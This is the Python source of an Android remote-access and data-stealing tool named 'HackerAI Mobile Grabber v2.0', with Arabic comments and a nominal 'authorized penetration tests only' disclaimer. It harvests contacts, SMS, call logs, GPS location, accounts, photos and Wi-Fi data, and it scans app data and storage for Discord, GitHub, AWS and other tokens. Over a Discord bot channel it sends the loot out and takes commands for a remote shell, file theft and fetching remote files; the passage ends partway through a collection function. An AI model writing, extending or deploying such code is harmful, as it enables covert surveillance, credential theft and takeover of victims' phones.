"""
HackerAI Mobile Grabber v2.0 - Android APK
للاختبارات الاختراق المرخصة فقط
"""

import os
import sys
import re
import json
import base64
import sqlite3
import shutil
import tempfile
import platform
import threading
import time
import socket
import uuid
import random
import hashlib
import subprocess
import glob
import fnmatch
from datetime import datetime

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

# محاولة استيراد مكتبات أندرويد
try:
    from jnius import autoclass
    from android import mActivity
    ANDROID = True
except ImportError:
    ANDROID = False

# ======= أنماط التوكنات =======
TOKEN_PATTERNS = [
    (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', 'Discord Token'),
    (r'mfa\.[\w-]{84}', 'Discord MFA Token'),
    (r'ghp_[a-zA-Z0-9]{36}', 'GitHub PAT'),
    (r'gho_[a-zA-Z0-9]{36}', 'GitHub OAuth'),
    (r'xox[baprs]-[0-9A-Za-z-]{10,}', 'Slack Token'),
    (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
    (r'sk_live_[0-9a-zA-Z]{24,}', 'Stripe Live Secret'),
    (r'pk_live_[0-9a-zA-Z]{24,}', 'Stripe Live Key'),
    (r'AIza[0-9A-Za-z_-]{35}', 'Google API Key'),
    (r'ya29\.[0-9A-Za-z_-]+', 'Google OAuth Token'),
    (r'EAACEdEose0cBA[0-9A-Za-z]+', 'Facebook Token'),
    (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', 'JWT Token'),
    (r'[0-9]{8,10}:[a-zA-Z0-9_-]{35}', 'Telegram Bot Token'),
    (r'npm_[a-zA-Z0-9]{36}', 'NPM Token'),
    (r'glpat-[a-zA-Z0-9_-]{20,}', 'GitLab PAT'),
    (r'NF[t][0-9A-Za-z]{20,}', 'Netflix Token'),
]

# ======= أدوات جمع البيانات من أندرويد =======
class AndroidCollector:
    """جمع البيانات من جهاز أندرويد"""
    
    @staticmethod
    def get_device_info():
        """معلومات الجهاز"""
        if not ANDROID:
            return {"error": "ليس جهاز أندرويد"}
        try:
            Build = autoclass('android.os.Build')
            VERSION = autoclass('android.os.Build$VERSION')
            return {
                "device": str(Build.DEVICE),
                "model": str(Build.MODEL),
                "manufacturer": str(Build.MANUFACTURER),
                "brand": str(Build.BRAND),
                "android_version": str(VERSION.RELEASE),
                "sdk": str(VERSION.SDK_INT),
                "serial": str(Build.SERIAL)[:10]
            }
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def get_contacts():
        """جهات الاتصال"""
        if not ANDROID:
            return {"error": "ليس أندرويد"}
        try:
            cr = mActivity.getContentResolver()
            uri = autoclass('android.provider.ContactsContract$Contacts').CONTENT_URI
            c = cr.query(uri, None, None, None, None)
            contacts = []
            if c:
                while c.moveToNext():
                    name = str(c.getString(c.getColumnIndex("display_name")))
                    phone_uri = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone').CONTENT_URI
                    pc = cr.query(phone_uri, None, 
                        autoclass('android.provider.ContactsContract$CommonDataKinds$Phone').CONTACT_ID + " = ?",
                        [c.getString(c.getColumnIndex("_id"))], None)
                    phones = []
                    if pc:
                        while pc.moveToNext():
                            phones.append(str(pc.getString(pc.getColumnIndex("data1"))))
                    contacts.append({"name": name, "phones": phones})
            return {"count": len(contacts), "contacts": contacts[:200]}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def get_sms():
        """الرسائل النصية"""
        if not ANDROID:
            return {"error": "ليس أندرويد"}
        try:
            cr = mActivity.getContentResolver()
            uri = autoclass('android.net.Uri').parse("content://sms/inbox")
            c = cr.query(uri, None, None, None, "date DESC")
            msgs = []
            if c:
                while c.moveToNext() and len(msgs) < 200:
                    msgs.append({
                        "from": str(c.getString(c.getColumnIndex("address"))),
                        "body": str(c.getString(c.getColumnIndex("body")))[:300],
                        "date": str(c.getString(c.getColumnIndex("date")))
                    })
            return {"count": len(msgs), "messages": msgs}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def get_calls():
        """سجل المكالمات"""
        if not ANDROID:
            return {"error": "ليس أندرويد"}
        try:
            cr = mActivity.getContentResolver()
            uri = autoclass('android.net.Uri').parse("content://call_log/calls")
            c = cr.query(uri, None, None, None, "date DESC")
            calls = []
            type_map = {"1": "وارد", "2": "صادر", "3": "فائت"}
            if c:
                while c.moveToNext() and len(calls) < 200:
                    t = str(c.getString(c.getColumnIndex("type")))
                    calls.append({
                        "number": str(c.getString(c.getColumnIndex("number"))),
                        "duration": str(c.getString(c.getColumnIndex("duration"))),
                        "type": type_map.get(t, "غير معروف"),
                        "date": str(c.getString(c.getColumnIndex("date")))
                    })
            return {"count": len(calls), "calls": calls}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def get_apps():
        """التطبيقات المثبتة"""
        if not ANDROID:
            return {"error": "ليس أندرويد"}
        try:
            pm = mActivity.getPackageManager()
            intent = autoclass('android.content.Intent')
            main = intent(autoclass('android.content.Intent').ACTION_MAIN)
            main.addCategory(autoclass('android.content.Intent').CATEGORY_LAUNCHER)
            apps = pm.queryIntentActivities(main, 0)
            installed = []
            for app in apps:
                ai = app.activityInfo
                installed.append({
                    "name": str(ai.loadLabel(pm)),
                    "package": str(ai.packageName)
                })
            return {"count": len(installed), "apps": installed}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def get_location():
        """الموقع الجغرافي"""
        if not ANDROID:
            return {"error": "ليس أندرويد"}
        try:
            Context = autoclass('android.content.Context')
            LocationManager = autoclass('android.location.LocationManager')
            lm = mActivity.getSystemService(Context.LOCATION_SERVICE)
            loc = {}
            try:
                gps = lm.getLastKnownLocation("gps")
                if gps:
                    loc['gps'] = {
                        "lat": gps.getLatitude(),
                        "lon": gps.getLongitude(),
                        "accuracy": gps.getAccuracy()
                    }
            except: pass
            try:
                net = lm.getLastKnownLocation("network")
                if net:
                    loc['network'] = {
                        "lat": net.getLatitude(),
                        "lon": net.getLongitude()
                    }
            except: pass
            return loc
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def get_accounts():
        """الحسابات المسجلة"""
        if not ANDROID:
            return {"error": "ليس أندرويد"}
        try:
            AccountManager = autoclass('android.accounts.AccountManager')
            am = AccountManager.get(mActivity)
            accounts = am.getAccounts()
            accts = []
            for acc in accounts:
                accts.append({
                    "name": str(acc.name),
                    "type": str(acc.type)
                })
            return {"count": len(accts), "accounts": accts}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def get_wifi():
        """معلومات الواي فاي"""
        if not ANDROID:
            return {"error": "ليس أندرويد"}
        try:
            Context = autoclass('android.content.Context')
            WifiManager = autoclass('android.net.wifi.WifiManager')
            wm = mActivity.getSystemService(Context.WIFI_SERVICE)
            info = wm.getConnectionInfo()
            return {
                "ssid": str(info.getSSID()),
                "bssid": str(info.getBSSID()),
                "rssi": info.getRssi(),
                "frequency": info.getFrequency(),
                "speed": info.getLinkSpeed()
            }
        except Exception as e:
            return {"error": str(e)}

# ======= صياد التوكنات =======
class TokenHunter:
    """البحث عن التوكنات في الجهاز"""
    
    def __init__(self):
        self.discord_tokens = []
        self.all_tokens = []
        self.scanned_files = 0
    
    def find_discord_tokens_android(self):
        """استخراج توكن ديسكورد من أندرويد"""
        paths = [
            "/data/data/com.discord",
            "/data/data/com.discord/shared_prefs",
            "/data/data/com.discord/databases",
            "/data/data/com.discord/files",
            "/data/data/com.discord/cache",
            "/data/data/com.discord/app_webview"
        ]
        found = []
        for base in paths:
            if not os.path.exists(base):
                continue
            try:
                for root, _, files in os.walk(base):
                    for f in files:
                        if f.endswith(('.ldb', '.log', '.db', '.xml', '.json')):
                            fp = os.path.join(root, f)
                            try:
                                if os.path.getsize(fp) > 500000:
                                    continue
                                with open(fp, 'r', errors='ignore') as fh:
                                    content = fh.read()
                                for m in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content):
                                    if m not in self.discord_tokens:
                                        self.discord_tokens.append(m)
                                        found.append(m)
                                for m in re.findall(r'mfa\.[\w-]{84}', content):
                                    if m not in self.discord_tokens:
                                        self.discord_tokens.append(m)
                                        found.append(f"MFA: {m}")
                            except: pass
            except: pass
        return found
    
    def scan_storage_for_tokens(self):
        """مسح التخزين بحثاً عن توكنات"""
        paths = ["/sdcard", "/storage/emulated/0"]
        found = []
        
        for base in paths:
            if not os.path.exists(base):
                continue
            try:
                for root, _, files in os.walk(base):
                    if root.count('/') > 7:
                        continue
                    for f in files:
                        if f.endswith(('.txt', '.log', '.env', '.json', '.xml', '.config')):
                            fp = os.path.join(root, f)
                            try:
                                if os.path.getsize(fp) > 1000000:
                                    continue
                                with open(fp, 'r', errors='ignore') as fh:
                                    content = fh.read()
                                for pattern, name in TOKEN_PATTERNS:
                                    for m in re.findall(pattern, content):
                                        found.append({
                                            "token": m[:50],
                                            "type": name,
                                            "file": fp
                                        })
                                        self.all_tokens.append(m[:50])
                            except: pass
                        self.scanned_files += 1
            except: pass
        return found
    
    def scan_app_data(self):
        """مسح بيانات التطبيقات"""
        apps = {
            "Telegram": "/data/data/org.telegram.messenger",
            "WhatsApp": "/data/data/com.whatsapp",
            "Twitter": "/data/data/com.twitter.android",
            "Instagram": "/data/data/com.instagram.android",
            "Facebook": "/data/data/com.facebook.katana",
            "Snapchat": "/data/data/com.snapchat.android",
            "Signal": "/data/data/org.thoughtcrime.securesms",
            "GitHub": "/data/data/com.github.android",
            "Slack": "/data/data/com.slack",
            "TikTok": "/data/data/com.zhiliaoapp.musically",
            "Chrome": "/data/data/com.android.chrome",
            "Firefox": "/data/data/org.mozilla.firefox",
            "Brave": "/data/data/com.brave.browser"
        }
        
        results = {}
        for name, path in apps.items():
            if not os.path.exists(path):
                continue
            app_tokens = []
            try:
                for root, _, files in os.walk(path):
                    for f in files:
                        if f.endswith(('.db', '.ldb', '.xml', '.json')):
                            fp = os.path.join(root, f)
                            try:
                                if os.path.getsize(fp) > 500000:
                                    continue
                                with open(fp, 'r', errors='ignore') as fh:
                                    content = fh.read()
                                for pattern, tname in TOKEN_PATTERNS:
                                    for m in re.findall(pattern, content):
                                        app_tokens.append({
                                            "token": m[:50],
                                            "type": tname,
                                            "file": f
                                        })
                                        self.all_tokens.append(m[:50])
                            except: pass
            except: pass
            if app_tokens:
                results[name] = {"count": len(app_tokens), "tokens": app_tokens[:20]}
        
        return results

# ======= بوت ديسكورد =======
class DiscordBot:
    def __init__(self, token, channel):
        self.token = token
        self.channel = channel
        self.api = "https://discord.com/api/v10"
        self.headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
        self.seen = set()
        self.android = AndroidCollector()
        self.hunter = TokenHunter()
        
        self.commands = {
            '!help': self.cmd_help,
            '!scan': self.cmd_scan,
            '!fullscan': self.cmd_fullscan,
            '!discord': self.cmd_discord,
            '!tokens': self.cmd_tokens,
            '!contacts': self.cmd_contacts,
            '!sms': self.cmd_sms,
            '!calls': self.cmd_calls,
            '!apps': self.cmd_apps,
            '!location': self.cmd_location,
            '!gps': self.cmd_location,
            '!accounts': self.cmd_accounts,
            '!device': self.cmd_device,
            '!wifi': self.cmd_wifi,
            '!files': self.cmd_files,
            '!photos': self.cmd_photos,
            '!shell': self.cmd_shell,
            '!download': self.cmd_download,
            '!upload': self.cmd_upload,
            '!whoami': self.cmd_whoami,
            '!ip': self.cmd_ip,
            '!status': self.cmd_status,
            '!clean': self.cmd_clean,
            '!collect': self.cmd_collect,
            '!selfdestruct': self.cmd_selfdestruct,
        }
        
        self.keylog_active = False
        self.keylog_data = []
    
    def send(self, msg, fp=None):
        """إرسال رسالة لديسكورد"""
        try:
            url = f"{self.api}/channels/{self.channel}/messages"
            if fp and os.path.exists(fp):
                with open(fp, 'rb') as f:
                    r = requests.post(url, 
                        headers={"Authorization": f"Bot {self.token}"},
                        files={'file': (os.path.basename(fp), f, 'application/octet-stream')},
                        data={'payload_json': json.dumps({'content': msg[:1900]})},
                        timeout=60)
                    return r.status_code == 200
            
            for i in range(0, len(msg), 1900):
                r = requests.post(url, headers=self.headers, 
                    json={'content': msg[i:i+1900]}, timeout=30)
            return True
        except:
            return False
    
    def save_and_send(self, data, filename="report"):
        """حفظ البيانات وإرسالها كملف"""
        try:
            fp = f"/data/local/tmp/{filename}_{uuid.uuid4().hex}.json"
            with open(fp, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            self.send(f"📎 {filename}", fp=fp)
            os.remove(fp)
            return True
        except:
            try:
                fp = f"/sdcard/{filename}_{uuid.uuid4().hex}.json"
                with open(fp, 'w') as f:
                    json.dump(data, f, indent=2, default=str)
                self.send(f"📎 {filename}", fp=fp)
                os.remove(fp)
                return True
            except:
                return False
    
    def listen(self):
        """الاستماع للأوامر من ديسكورد"""
        # رسالة البدء
        device = self.android.get_device_info()
        info = f"🟢 **وكيل أندرويد متصل**\n💻 {socket.gethostname()}"
        if not device.get("error"):
            info += f"\n📱 {device.get('model', '?')} - Android {device.get('android_version', '?')}"
        info += f"\n🆔 الجلسة: {hashlib.md5(f'{socket.gethostname()}-{time.time()}'.encode()).hexdigest()[:12]}"
        self.send(info)
        
        print("[*] بوت أندرويد يعمل... أنتظر الأوامر في ديسكورد")
        
        while True:
            try:
                r = requests.get(f"{self.api}/channels/{self.channel}/messages",
                    headers=self.headers, params={'limit': 10}, timeout=30)
                
                if r.status_code == 200:
                    for msg in r.json():
                        mid = msg['id']
                        if mid in self.seen or msg['author'].get('bot', False):
                            self.seen.add(mid)
                            continue
                        self.seen.add(mid)
                        
                        content = msg.get('content', '')
                        if content.startswith('!'):
                            parts = content.split()
                            cmd = parts[0].lower()
                            args = parts[1:]
                            
                            print(f"[*] أمر: {content}")
                            
                            if cmd in self.commands:
                                try:
                                    result = self.commands[cmd](args)
                                    if len(result) > 1900:
                                        self.send(f"```\n{result[:1900]}\n```")
                                        self.send(f"```\n{result[1900:3800]}\n```")
                                    else:
                                        self.send(f"```\n{result}\n```")
                                except Exception as e:
                                    self.send(f"❌ خطأ: {str(e)[:500]}")
                            else:
                                self.send(f"❌ أمر غير معروف: `{cmd}`\nاستخدم `!help`")
                
                time.sleep(2)
            except Exception as e:
                print(f"[-] خطأ: {e}")
                time.sleep(5)
    
    # ========== الأوامر ==========
    
    def cmd_help(self, args):
        return """╔══════════════════════════════╗
║   HACKERAI ANDROID GRABBER  ║
╚══════════════════════════════╝

📱 **بيانات الجهاز:**
!device     - معلومات الجهاز
!contacts   - جهات الاتصال
!sms        - الرسائل النصية
!calls      - سجل المكالمات
!apps       - التطبيقات المثبتة
!location   - الموقع الجغرافي
!gps        - نفس الموقع
!accounts   - الحسابات المسجلة
!wifi       - معلومات الشبكة

🎯 **التوكنات:**
!scan       - مسح سريع
!fullscan   - مسح كامل
!discord    - توكن ديسكورد
!tokens     - كل التوكنات

📁 **الملفات:**
!photos     - صور الجهاز
!files *.txt- بحث عن ملفات
!download p - تحميل ملف
!shell cmd  - تشغيل أمر

⚙️ **النظام:**
!collect    - جمع كل البيانات
!clean      - تنظيف
!whoami     - المستخدم
!ip         - IP العام
!status     - الحالة
!selfdestruct - تدمير ذاتي"""

    def cmd_scan(self, args):
        """مسح سريع"""
        self.send("⏳ جاري المسح السريع...")
        
        dt = self.hunter.find_discord_tokens_android()
        tokens = self.hunter.scan_storage_for_tokens()
        
        result = f"🎯 **المسح السريع**\n📱 {socket.gethostname()}\n"
        result += f"🎫 توكنات ديسكورد: {len(dt)}\n"
        result += f"🔑 توكنات أخرى: {len(tokens)}\n"
        result += f"📁 ملفات ممسوحة: {self.hunter.scanned_files}"
        
        if dt:
            self.send("🎫 **توكنات ديسكورد:**\n" + '\n'.join([f"`{t}`" for t in dt[:5]]))
            self.save_and_send({"discord_tokens": dt}, "discord_tokens")
        
        return result

    def cmd_fullscan(self, args):
        """مسح كامل"""
        self.send("⏳ جاري المسح الكامل...")
        
        results = {}
        
        # جهات الاتصال
        contacts = self.android.get_contacts()
        if not contacts.get("error"):
            results['contacts'] = contacts
        self.send(f"📞 جهات الاتصال: {contacts.get('count', 0)}")
        
        # الرسائل
        sms = self.android.get_sms()
        if not sms.get("error"):
            results['sms'] = sms
        self.send(f"💬 الرسائل: {sms.get('count', 0)}")
        
        # المكالمات
        calls = self.android.get_calls()
        if not calls.get("error"):
            results['calls'] = calls
        self.send(f"📞 المكالمات: {calls.get('count', 0)}")
        
        # التطبيقات
        apps = self.android.get_apps()
        if not apps.get("error"):
            results['apps'] = apps
        
        # الموقع
        loc = self.android.get_location()
        if loc and not loc.get("error"):
            results['location'] = loc
            if 'gps' in loc:
                l = loc['gps']
                self.send(f"📍 **الموقع:**\n{loc['gps']['lat']}, {loc['gps']['lon']}")
        
        # الحسابات
        accounts = self.android.get_accounts()
        if not accounts.get("error"):
            results['accounts'] = accounts
            self.send(f"🔑 الحسابات: {accounts.get('count', 0)}")
        
        # معلومات الجهاز
        device = self.android.get_device_info()
        if not device.get("error"):
            results['device'] = device
        
        # التوكنات
        dt = self.hunter.find_discord_tokens_android()
        results['discord_tokens'] = dt
        if dt:
            self.send(f"🎫 توكنات ديسكورد: {len(dt)}")
        
        ft = self.hunter.scan_storage_for_tokens()
        results['file_tokens'] = ft[:50]
        
        # بيانات التطبيقات
        app_data = self.hunter.scan_app_data()
        results['app_tokens'] = app_data
        
        # الواي فاي
        wifi = self.android.get_wifi()
        if not wifi.get("error"):
            results['wifi'] = wifi
            self.send(f"📶 الواي فاي: {wifi.get('ssid', '?')}")
        
        # إرسال التقرير الكامل
        self.save_and_send(results, "full_scan_report")
        
        return f"✅ **المسح الكامل اكتمل**\n📁 {len(results)} وحدة\n📎 تم إرسال التقرير"

    def cmd_discord(self, args):
        """استخراج توكن ديسكورد"""
        dt = self.hunter.find_discord_tokens_android()
        if dt:
            self.save_and_send({"discord_tokens": dt}, "discord_tokens")
            return f"🎫 **توكنات ديسكورد:** {len(dt)}\n" + '\n'.join([f"`{t}`" for t in dt[:10]])
        return "❌ لم يتم العثور على توكنات ديسكورد\n(قد يحتاج صلاحيات root)"

    def cmd_tokens(self, args):
        """عرض التوكنات"""
        dt = self.hunter.find_discord_tokens_android()
        ft = self.hunter.scan_storage_for_tokens()
        
        result = "**🎯 كل التوكنات:**\n\n"
        if dt:
            result += f"**🎫 ديسكورد ({len(dt)}):**\n"
            for t in dt[:5]:
                result += f"`{t[:40]}...`\n"
        if ft:
            result += f"\n**🔑 أخرى ({len(ft)}):**\n"
            for f in ft[:10]:
                result += f"`{f['token']}` ({f['type']})\n"
        if not dt and not ft:
            result = "❌ لا توجد توكنات. استخدم `!scan` أولاً"
        
        return result[:1900]

    def cmd_contacts(self, args):
        """جهات الاتصال"""
        data = self.android.get_contacts()
        if data.get("error"):
            return f"❌ {data['error']}"
        
        result = f"**📞 جهات الاتصال: {data['count']}**\n\n"
        for c in data.get('contacts', [])[:30]:
            phones = ', '.join(c.get('phones', ['لا يوجد رقم']))
            result += f"👤 {c['name']}\n  📱 {phones}\n"
        
        self.save_and_send(data, "contacts")
        return result[:1900]

    def cmd_sms(self, args):
        """الرسائل النصية"""
        data = self.android.get_sms()
        if data.get("error"):
            return f"❌ {data['error']}"
        
        result = f"**💬 الرسائل النصية: {data['count']}**\n\n"
        for m in data.get('messages', [])[:15]:
            result += f"📩 من: {m['from']}\n  {m['body'][:100]}\n\n"
        
        self.save_and_send(data, "sms_messages")
        return result[:1900]

    def cmd_calls(self, args):
        """سجل المكالمات"""
        data = self.android.get_calls()
        if data.get("error"):
            return f"❌ {data['error']}"
        
        result = f"**📞 سجل المكالمات: {data['count']}**\n\n"
        for c in data.get('calls', [])[:20]:
            result += f"{'📞' if c['type']=='وارد' else '📤' if c['type']=='صادر' else '❌'} {c['number']} ({c['duration']}ث) - {c['type']}\n"
        
        self.save_and_send(data, "call_log")
        return result[:1900]

    def cmd_apps(self, args):
        """التطبيقات المثبتة"""
        data = self.android.get_apps()
        if data.get("error"):
            return f"❌ {data['error']}"
        
        result = f"**📱 التطبيقات: {data['count']}**\n\n"
        for a in data.get('apps', [])[:30]:
            result += f"• {a['name']}\n  `{a['package']}`\n"
        
        self.save_and_send(data, "installed_apps")
        return result[:1900]

    def cmd_location(self, args):
        """الموقع الجغرافي"""
        data = self.android.get_location()
        if not data or data.get("error"):
            return "❌ لا يمكن الحصول على الموقع\n(تأكد من تفعيل GPS)"
        
        result = "**📍 الموقع:**\n"
        if 'gps' in data:
            g = data['gps']
            result += f"🛰 GPS:\n  Lat: {g['lat']}\n  Lon: {g['lon']}\n"
            result += f"📍 https://maps.google.com/?q={g['lat']},{g['lon']}\n"
        if 'network' in data:
            n = data['network']
            result += f"📡 شبكة:\n  Lat: {n['lat']}\n  Lon: {n['lon']}"
        
        return result

    def cmd_accounts(self, args):
        """الحسابات المسجلة"""
        data = self.android.get_accounts()
        if data.get("error"):
            return f"❌ {data['error']}"
        
        result = f"**🔑 الحسابات: {data['count']}**\n\n"
        for a in data.get('accounts', []):
            result += f"• {a['name']} ({a['type']})\n"
        
        self.save_and_send(data, "accounts")
        return result[:1900]

    def cmd_device(self, args):
        """معلومات الجهاز"""
        data = self.android.get_device_info()
        if data.get("error"):
            return f"❌ {data['error']}"
        
        return f"""**📱 معلومات الجهاز:**
الطراز: {data.get('model', '?')}
الشركة: {data.get('manufacturer', '?')}
أندرويد: {data.get('android_version', '?')}
SDK: {data.get('sdk', '?')"""
        
    def cmd_wifi(self, args):
        """معلومات الواي فاي"""
        data = self.android.get_wifi()
        if data.get("error"):
            return f"❌ {data['error']}"
        
        return f"""**📶 معلومات الواي فاي:**
📡 SSID: {data.get('ssid', '?')}
📍 BSSID: {data.get('bssid', '?')}
📶 الإشارة: {data.get('rssi', '?')} dBm"""

    def cmd_files(self, args):
        """البحث عن ملفات"""
        if not args:
            return "استخدام: !files *.pdf أو !files *.txt,*.kdbx"
        
        pattern = ' '.join(args)
        paths = ["/sdcard", "/storage/emulated/0"]
        
        found = []
        for p in pattern.split(','):
            p = p.strip()
            if '*' not in p:
                p = f"*{p}*"
            for base in paths:
                if not os.path.exists(base):
                    continue
                try:
                    for root, _, files in os.walk(base):
                        if root.count('/') > 7:
                            continue
                        for f in files:
                            if fnmatch.fnmatch(f, p):
                                fp = os.path.join(root, f)
                                try:
                                    sz = os.path.getsize(fp)
                                    found.append(f"📄 {fp} ({sz:,} بايت)")
                                except:
                                    found.append(f"📄 {fp}")
                                if len(found) >= 40:
                                    break
                        if len(found) >= 40:
                            break
                except: pass
        
        if found:
            return '\n'.join(found[:40])
        return f"❌ لا توجد ملفات تطابق `{pattern}`"

    def cmd_photos(self, args):
        """جلب الصور"""
        paths = [
            "/sdcard/DCIM/Camera",
            "/sdcard/Pictures",
            "/storage/emulated/0/DCIM/Camera"
        ]
        
        photos = []
        for p in paths:
            if os.path.exists(p):
                for f in os.listdir(p):
                    if f.lower().endswith(('.jpg', '.jpeg', '.png')):
                        fp = os.path.join(p, f)
                        try:
                            sz = os.path.getsize(fp)
                            if sz < 10 * 1024 * 1024:
                                photos.append((fp, sz))
                        except: pass
        
        photos.sort(key=lambda x: x[1], reverse=True)
        
        # إرسال أحدث 3 صور
        sent = 0
        for fp, sz in photos[:5]:
            if sent >= 3:
                break
            try:
                self.send(f"📸 {os.path.basename(fp)} ({sz//1024}KB)", fp=fp)
                sent += 1
            except: pass
        
        return f"**📸 الصور: {len(photos)}**\nتم إرسال {sent} صور"

    def cmd_shell(self, args):
        """تشغيل أمر"""
        if not args:
            return "استخدام: !shell <أمر>\nمثال: !shell ls -la /sdcard"
        
        cmd = ' '.join(args)
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            output = (r.stdout + r.stderr).strip()
            return output[:1900] if output else "✅ تم (لا يوجد مخرجات)"
        except subprocess.TimeoutExpired:
            return "❌ انتهت المهلة"
        except Exception as e:
            return f"❌ خطأ: {e}"

    def cmd_download(self, args):
        """تحميل ملف"""
        if not args:
            return "استخدام: !download <المسار>\nمثال: !download /sdcard/secret.txt"
        
        path = ' '.join(args)
        if not os.path.exists(path):
            return f"❌ الملف غير موجود: {path}"
        
        try:
            sz = os.path.getsize(path)
            if sz > 25 * 1024 * 1024:
                return f"❌ الملف كبير جداً ({sz//1024//1024}MB)"
            
            self.send(f"📥 **تحميل:** {path} ({sz:,} بايت)", fp=path)
            return f"✅ تم إرسال: {path}"
        except Exception as e:
            return f"❌ خطأ: {e}"

    def cmd_upload(self, args):
        """رفع ملف"""
        if len(args) < 2:
            return "استخدام: !upload <URL> <المسار>\nمثال: !upload https://example.com/file.apk /sdcard/file.apk"
        
        url = args[0]
        dest = ' '.join(args[1:])
        
        try:
            r = requests.get(url, timeout=60, stream=True)
            if r.status_code != 200:
                return f"❌ HTTP {r.status_code}"
            
            with open(dest, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            
            return f"✅ {url}\n→ {dest}\n({os.path.getsize(dest):,} بايت)"
        except Exception as e:
            return f"❌ خطأ: {e}"

    def cmd_whoami(self, args):
        """المستخدم الحالي"""
        return f"👤 **المستخدم:** {os.environ.get('USER') or 'app'}\n💻 **الجهاز:** {socket.gethostname()}"

    def cmd_ip(self, args):
        """IP العام"""
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
            return f"🌍 **IP العام:** {ip}"
        except:
            return "❌ لا يمكن الحصول على IP"

    def cmd_status(self, args):
        """حالة النظام"""
        device = self.android.get_device_info()
        wifi = self.android.get_wifi()
        
        status = f"🟢 **حالة النظام**\n"
        status += f"💻 {socket.gethostname()}\n"
        if not device.get("error"):
            status += f"📱 {device.get('model', '?')} - Android {device.get('android_version', '?')}\n"
        if not wifi.get("error"):
            status += f"📶 {wifi.get('ssid', '?')}\n"
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
            status += f"🌍 {ip}"
        except:
            pass
        
        return status

    def cmd_collect(self, args):
        """جمع كل البيانات"""
        self.send("⏳ جاري جمع كل البيانات...")
        
        results = {}
        
        # جهات الاتصال
        c = self.android.get_contacts()
        if not c.get("error"):
            results['contacts'] = c
        self.send(f"✅ جهات الاتصال: {c.get('count', 0)}")
        
        # الرسائل
        s = self.android.get_sms()
        if not s.get("error"):
            results['sms'] = s
        self.send(f"✅ الرسائل: {s.get('count', 0)}")